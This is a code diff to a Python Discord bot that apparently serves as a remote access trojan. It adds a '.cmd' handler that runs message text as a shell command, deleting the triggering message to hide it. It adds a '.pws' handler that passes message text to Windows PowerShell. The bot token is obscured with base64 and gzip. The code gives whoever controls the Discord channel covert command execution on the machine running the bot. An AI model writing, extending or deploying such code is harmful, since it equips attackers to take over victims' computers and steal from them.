@@ -7,6 +7,7 @@ import libs.files as files
 from shutil import copy;
 import base64
 import gzip
+import subprocess
 
 #TODO
 # - Add more commands
@@ -449,6 +450,21 @@ async def on_message(message):
     #CMD
     if message.content.startswith(".cmd"):
         arg = message.content.replace(".cmd ","")
-        os.system(arg)
+        #run cmd and send feedback from cmd
+        await message.delete()
+        try:
+            subprocess.call(arg, shell=True)
+            embed = discord.Embed(title="CMD", description="Command executed.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="CMD", description="Failed to run command.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            return
+    
+    #PWS
+    if message.content.startswith(".pws"):
+        arg = message.content.replace(".pws ","")
+        subprocess.call("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe " + arg, shell=True)
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
